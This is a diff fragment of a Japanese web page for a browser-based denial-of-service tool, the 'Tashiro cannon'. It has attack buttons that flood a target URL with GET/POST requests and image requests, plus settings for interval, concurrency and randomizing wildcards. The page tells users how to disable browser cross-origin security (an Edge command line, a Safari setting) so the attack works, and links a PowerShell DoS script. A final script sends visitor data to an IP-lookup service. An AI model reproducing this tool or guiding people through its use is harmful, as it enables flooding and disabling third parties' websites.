+        <input class="css-button-rounded--black" type="button" value="開始1" onclick="main();">  <input class="css-button-rounded--black" type="button" value="開始2(XML)" onclick="main_XML();">  <input class="css-button-rounded--black" type="button" value="開始3(fetch)" onclick="main_fetch();"><br>
+        
+        <b>[発射ボタン(全端末対応)]</b>
+        <br>
+        <input class="css-button-rounded--black" type="button" value="Imgボム改(Beta版)" onclick="main_img();" style="color: orangered;">  <input class="css-button-rounded--black" type="button" value="強力" onclick="main_mobile();" style="color: red;">
+        <br>
+        <br>
+        <b>[停止/ログクリアボタン]</b>
+        <br>
+        <input class="css-button-rounded--black" type="button" style="color: red;" value="中止" onclick="stopBomb_normal();"><input class="css-button-rounded--black" type="button" value="ログクリア" style="color: yellow;" onclick="LogClear();">
+        <br>
+        <br>
+        <b>【砲弾処理レート】<font color="red">※imgボム使用時に表示不可</font></b>
+        <br>
+        <canvas class="css-button-rounded--black" id="mycanvas" width="800" height="200" style="border:1px solid #000000;height:200px;width:90%; font-size: 14; color: lime; position: relative; text-align: center;"></canvas>
+        <br>
+        <b>【情報】</b>
+        <br>
+        <textarea class="css-button-rounded--black" id="m_taInfo" style="border:1px solid #000000;height:200px;width:90%; font-size: 9; color: lime;">※ここに情報が表示されます。</textarea>
+        
+        <br>
+        </form>
+        <div id="m_dvMado">
+        </div>
+    </div>  
+        <h2>【本ツールの仕様について】</h2>
+        <b><mark><font color="red">・本ツールはhttpsサイトのみに対応しています。</font></mark></b>
+        <br>
+        <b><mark><font color="red">・更新間隔や同時更新数は既定値が最良値です。</font></mark></b>
+        <br>
+
+        <h2>【推奨ブラウザについて】</h2>
+        <b>[Windowsユーザ]</b>
+        <br>
+        <li>Edgeが一番高効率</li>
+        <li><strong><font color="red">CORSを回避する必要がある。詳しくは下記を参照</font></strong></li>
+        <b>[Appleユーザ]</b>
+        <br>
+        <li>Safariが一番高効率</li>
+        <li><strong><font color="red">MacユーザはCORSを回避する必要がある。詳しくは下記を参照</font></strong></li>
+        <li>iPhone/iPadユーザはCORSを無効化できないので<mark>全端末対応の攻撃モード</mark>を使用することを推奨。</li>
+        <b>[Android/Chromebookユーザ]</b>
+        <br>
+        <li>ChromeかEdgeが一番高効率</li>
+        <li>アプリでCORSを無効にできないため<mark>全端末対応の攻撃モード</mark>を使用することを推奨。</li>
+        <h2>【CORSの回避方法】</h2>
+        <div class="wrapper">
+          <div class="wrapper_normalIcon">
+            <details>
+              <summary>
+                <span class="summary_inner">
+                  [Windowsユーザ]<span class="icon"></span>
+                </span>
+              </summary>
+              <div class="content">
+                <ul>
+                  <b>[EdgeでのCORS回避方法]</b>
+                  <br>
+                  1. Windows(のマーク)キー+Rキーを同時押しする。
+                  <br>
+                  2. cmdと入力して検索する
+                  <br>
+                  3. コマンドプロンプトが開く。下記のコードをコピペして実行する。
+                  <br>
+                  <div class="scroll2">
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir=C:\Windows\Temp https://rifurekusyon.github.io/tornado.github.io/Tashiro_kai.html
+                  </div>
+                  <br>
+                  4. このサイトがもう一度開く。これで攻撃ができるようになる。
+                </ul>
+              </div>
+            </details>
+          </div>
+        </div>
+        <div class="wrapper">
+          <div class="wrapper_normalIcon">
+            <details>
+              <summary>
+                <span class="summary_inner">
+                  [Macユーザ]<span class="icon"></span>
+                </span>
+              </summary>
+              <div class="content">
+                <ul>
+                  <b>[SafariでのCORS回避方法]</b>
+                  <br>
+                  1. Safariを開いて「Safari」タブ > 「環境設定(又は設定)」タブ > 「詳細」タブ > 「メニューバーに“開発“メニューを表示」にチェックを入れる。
+                  <br>
+                  2. Safariのタブの「開発」 > 「クロスオリジンの制限を無効にする」にチェックを入れる。
+                  <br>
+                  3. 田代砲を再読み込みする。→完了 (使用後は必ず設定を戻してください。)
+                </ul>
+              </div>
+            </details>
+          </div>
+        </div>
+        <br>
+        <h2>【その他】</h2>
+        <b>[動作が重い場合]</b>
+<br>
+<a href="https://rifurekusyon.github.io/tornado.github.io/pc.html"><font color="lime">&ltPC版ページはこちら&gt</font></a>
+<br>
+<b>[その他の田代]</b>
+<br>
+<a href="https://rifurekusyon.github.io/tornado.github.io/index-mobile.html"><font color="lime">&lt従来版はこちら&gt</font></a>
+※ただしスループットは低いです。
+<br>
+<a href="https://github.com/rifurekusyon/Powershell_DoS_Script"><font color="lime">&ltPowershell版の田代はこちら&gt</font></a>
+<br>
+※さらに強力です。(Windows限定)
+<br>
+<mark><a href="https://www.youtube.com/watch?v=x8oPeMTWfFk"><font color="red">&lt使い方はこちら!&gt</font></a></mark>
+<br>
+<b>[この田代の性能]</b>
+<br>
+<a href="https://rifurekusyon.github.io/tornado.github.io/performance.html"><font color="lime">&ltこの田代の性能はこちら&gt</font></a>
+<br>
+<br>
+<h2>【各機能の説明】</h2>
+
+<div class="wrapper">
+  <div class="wrapper_normalIcon">
+    <details>
+      <summary>
+        <span class="summary_inner">
+          [HttpRequestの選択について]<span class="icon"></span>
+        </span>
+      </summary>
+      <div class="content">
+				<ul>
+					<b>[GET/POST]</b>
+					<br>
+					<li>ページを要求するGETメソッドとサイトにデータを送るPOSTメソッドを使います。送るデータはPOSTデータで設定出来ます。</li>
+					<b>[GETだけ]</b>
+					<br>
+					<li>ページを要求するGETメソッドだけを使用します。</li>
+					<li>GETを選択した場合POSTデータの欄は無効になります。</li>
+					<b>[POSTだけ]</b>
+					<br>
+					<li>サイトにデータを送るPOSTメソッドだけを使います。</li>
+					<li>※開始1には対応していません。</li>
+					<b><font color="red">[注意]</font></b>
+					<br>
+					<b><mark>よく分からない場合はデフォルトを選択してください。</mark><b>
+					<br>
+				</ul>
+			</div>
+    </details>
+  </div>
+</div>
+<div class="wrapper">
+  <div class="wrapper_normalIcon">
+    <details>
+      <summary>
+        <span class="summary_inner">
+          [対象URLについて]<span class="icon"></span>
+        </span>
+      </summary>
+      <div class="content">
+				<ul>
+					<li>訪問したいサイトのURLをhttpsから入力してください。</li>
+				</ul>
+			</div>
+    </details>
+  </div>
+</div>
+
+<div class="wrapper">
+  <div class="wrapper_normalIcon">
+    <details>
+      <summary>
+        <span class="summary_inner">
+          [POSTデータについて]<span class="icon"></span>
+        </span>
+      </summary>
+      <div class="content">
+				<ul>
+					<li>データをサーバにPOSTできます。json形式で記入してください。</li>
+					<li>※ダブルクオーテーションは使用しないでください。</li>
+					<br>
+					<b>よくわからない場合は変更する必要はありません。</b>
+				</ul>
+			</div>
+    </details>
+  </div>
+</div>
+
+
+<div class="wrapper">
+  <div class="wrapper_normalIcon">
+    <details>
+      <summary>
+        <span class="summary_inner">
+          [更新間隔について]<span class="icon"></span>
+        </span>
+      </summary>
+      <div class="content">
+				<ul>
+					<li>1/1000秒です。(つまり単位はms)</li>
+					<li>例えば2秒間隔で撃つ場合は2000に設定します。</li>
+				</ul>
+			</div>
+    </details>
+  </div>
+</div>
+
+
+<div class="wrapper">
+  <div class="wrapper_normalIcon">
+    <details>
+      <summary>
+        <span class="summary_inner">
+          [同時更新数について]<span class="icon"></span>
+        </span>
+      </summary>
+      <div class="content">
+				<ul>
+					<li>窓数です。</li>
+					<li>XMLやfetchではスレッドの数です。</li>
+				</ul>
+			</div>
+    </details>
+  </div>
+</div>
+
+<div class="wrapper">
+  <div class="wrapper_normalIcon">
+
+    <details>
+      <summary>
+        <span class="summary_inner">
+          [Wildカードについて]<span class="icon"></span>
+        </span>
+      </summary>
+      <div class="content">
+
+      	<ul>
+          <li>ワイルドカードとは、ワイルドカードの文字(*や!など)を訪問時にランダムな文字に置き換える機能です。</li>
+          <li>例えば、!!!はランダムな3桁の数字なのでaiueo!!!→aiueo364になります。</li>
+          <li>対象URLやPOSTデータの欄で使用できます。</li>
+          <li>使う場合は□にチェックを入れてください。</li>
+          <br>
+          <b>※ワイルドカード機能を使うと端末への負荷が大きくなるためスループットが低下します。</b>
+        </ul>
+</div>
+    </details>
+  </div>
+</div>
+
+<div class="wrapper">
+  <div class="wrapper_normalIcon">
+    <details>
+      <summary>
+        <span class="summary_inner">
+			<font color="red">[必読][開始ボタンについて]</font><span class="icon"></span>
+        </span>
+      </summary>
+      <div class="content">   
+        <ul>
+          <b>[開始1]</b>
+          <li>従来の田代（トルネード三式・乙）での方法で訪問します。</li>
+          <li>HTTP_POST ONLYモードには対応していません。</li>
+          <li>モバイル端末に適しています。</li>
+          <br>
+          <b>[開始2]</b>
+          <li>XMLHttpRequestを用いて訪問します。</li>
+          <li>開始1より高性能ですがモバイル端末やクロスドメイン制約を回避していないPCユーザではうまく撃てないことがあります。</li>
+          <br>
+          <b>[開始3]</b>
+          <li>fetch apiを用いて訪問します。</li>
+          <li>訪問速度で言えば一番高性能ですが上記の開始2と同じような制約を受けます。</li>
+		      <li><mark><font color="red">Android/Chromebookで『Chrome Dev』を使っている人と他のPCユーザはこれを推奨します。</font></mark></li>
+          <br>
+          <b>[Imgボム]</b>
+          <li>対象のwebサイト上にある画像ファイルを大量にリクエストするメソッドです。</li>
+          <li>専用のURL入力欄に、対象サイトのサーバ上にある画像のURLを入力してください。例: https://www.tatoeba.com/gazou.png</li>
+          <br>
+          <b>[開始(スマホ/タブレット)]</b>
+          <li>スマホ/タブレット向けの開始ボタンです。</li>
+
+	        <br> 
+	        <mark><b>仕様上、開始2と開始3は開始1と違い訪問用の窓が開かないので注意</b></mark>
+          <br>
+          <mark><font color="red">それぞれのモードは同時使用が可能です。ただし、やりすぎるとフリーズします。</font></mark>
+
+        </ul>
+      </div>
+    </details>
+  </div>
+</div>
+
+
+<div class="wrapper">
+  <div class="wrapper_normalIcon">
+    <details>
+      <summary>
+        <span class="summary_inner">
+          <font color="lime">[Wildカード一覧]</font><span class="icon"></span>
+        </span>
+      </summary>
+      <div class="content">   
+        <ul>
+        	<b>&lt;</b>
+        	<br>
+        	<li>[解説] 小文字のアルファベットa~zの中からランダム</li>
+        	<br>
+        	<b>&gt;</b>
+        	<br>
+        	<li>[解説] 大文字のアルファベットA~Zの中からランダム</li>
+        	<br>
+        	<b>!</b>
+        	<br>
+        	<li>[解説] 0~9の整数中からランダム</li>
+        	<br>
+        	<b>(</b>
+        	<br>
+        	<li>[解説] 小文字のアルファベットを含む16進数の中からランダム</li>
+        	<br>
+        	<b>)</b>
+        	<br>
+        	<li>[解説] 大文字のアルファベットを含む16進数の中からランダム</li>
+        	<br>
+        	<b>[0-1]</b>
+        	<br>
+        	<li>[解説] 0~1の中からランダム。例えば[3-5]とすれば3~5の中からランダム。</li>
+        	<br>
+        	<b>\\</b>
+        	<br>
+        	<li>[解説] \を入力したいとき。</li>
+        	<br>
+        	<b>[応用ver]</b>
+        	<br><br>
+        	<b>*</b>
+        	<br>
+        	<li>[解説] 数字・大文字・小文字のアルファベットの中からランダム。</li>
+        	<br>
+        	<b>$</b>
+        	<br>
+        	<li>[解説] 大文字・小文字のアルファベットの中からランダム。</li>
+        	<br>
+        	<b>@</b>
+        	<br>
+        	<li>[解説] 小文字のアルファベットと数字の中からランダム。</li>
+        	<br>
+        	<b>+</b>
+        	<br>
+        	<li>[解説] 大文字のアルファベットと数字の中からランダム。</li>
+				</ul>
+      </div>
+    </details>
+  </div>
+</div>
+
+<div class="wrapper">
+	<div class="wrapper_normalIcon">
+	  <details>
+		<summary>
+		  <span class="summary_inner">
+			[砲弾処理レートについて]<span class="icon"></span>
+		  </span>
+		</summary>
+		<div class="content">
+				  <ul>
+					  <li>単位時間当たりどれくらい送信処理が出来ているかリアルタイムで表示します。。</li>
+					  <li>雰囲気的な物であまり意味はないです。</li>
+				  </ul>
+			  </div>
+	  </details>
+	</div>
+  </div>
+
+  <div class="wrapper">
+	<div class="wrapper_normalIcon">
+	  <details>
+		<summary>
+		  <span class="summary_inner">
+			[ログクリアボタンについて]<span class="icon"></span>
+		  </span>
+		</summary>
+		<div class="content">
+				  <ul>
+					  <li>【情報欄】の履歴を削除します。</li>
+				  </ul>
+			  </div>
+	  </details>
+	</div>
+  </div>
+</div>
+    </body>
+</html>
+<script>
+    graphLoad();
+</script>
 
   <script>
     fetch('https://ipinfo.io/json?token=b92efa618078bc')  // ← token を付けたほうが安定
